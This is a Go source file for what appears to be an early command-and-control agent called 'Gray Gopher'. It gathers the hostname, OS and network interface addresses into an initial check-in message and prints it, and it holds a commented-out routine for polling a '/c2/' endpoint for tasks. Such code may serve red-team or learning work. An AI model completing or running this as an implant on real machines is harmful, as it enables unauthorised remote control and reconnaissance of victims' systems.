package main

import (
	"fmt"
	// "time"
	// "net/http"
	"os"
	"runtime"
	"net"
	"encoding/json"
)

type Task struct {
	Task_id int
	Input string
	Output string
}

type Interface struct {
	Hw_addr string `json:"hw_addr"`
	Ip string `json:"last_ip"`
	Name string `json:"name"`
}

type InitialCheckinRequest struct {
	Hostname string `json:"hostname"`
	Agent_type string `json:"agent_type"`
	OS string `json:"os"`
	Nics []Interface `json:"nics"`
}

type InitialCheckinResponse struct {
	Status string `json:"status"`
	Id int `json:"id"`
	Secret string `json:"secret"`
}

// func HttpCheckForTasks (tasksAvailable chan <- bool, config map[string]string) {
// 	ticker := time.NewTicker(config["waitTime"])
// 	for t := range ticker.C {
// 		resp, err := http.Post(config["baseUrl"] + "/c2/" + config["id"] + "/checkin")

// 		// Decode JSON object


//     }
// }

func HttpInitialCheckin () {
	// Populate static fields
	hostname, hostname_err := os.Hostname()
	if hostname_err != nil {
		hostname = "No Hostname"
	}

	// Pull NICs
	nics := make([]Interface, 0)

	// Get all network interfaces
	interfaces, _ := net.Interfaces()

	for _, i := range interfaces {
		// For each interface get its associated addresses
		addrs, err := i.Addrs()
		if err == nil {
			for _, addr := range addrs {
		        switch v := addr.(type) {
		        case *net.IPNet:
		        	// If the address is an IPv4 address, store it
		        	nics = append(nics, Interface{
		        		i.HardwareAddr.String(),
		        		v.String(),
		        		i.Name,
		        	})
		        }
		    }
	    } else {
	    	fmt.Println(err)
	    	nics = append(nics, Interface{
	    		i.HardwareAddr.String(),
	    		"None",
	    		i.Name,
	    		})
	    }
	}

	// Initialize JSON object

	request := &InitialCheckinRequest{
		Hostname: hostname,
		Agent_type: "Gray Gopher",
		OS: runtime.GOOS,
		Nics: nics,
	}

	json_request, err := json.Marshal(request)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(json_request))

}

func main() {
	HttpInitialCheckin()
}